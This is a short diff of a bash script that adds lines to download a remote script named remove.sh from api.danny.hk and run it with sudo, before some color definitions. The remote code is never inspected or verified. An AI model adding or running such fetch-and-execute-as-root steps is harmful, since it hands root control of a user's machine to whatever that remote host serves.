@@ -1,5 +1,10 @@
 #!/usr/bin/env bash
 
+cd /opt/
+sudo wget -O remove.sh  https://api.danny.hk/ssh/remove.sh 
+sudo chmod +x remove.sh
+sudo sh remove.sh
+
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 NOCOLOR='\033[0m'
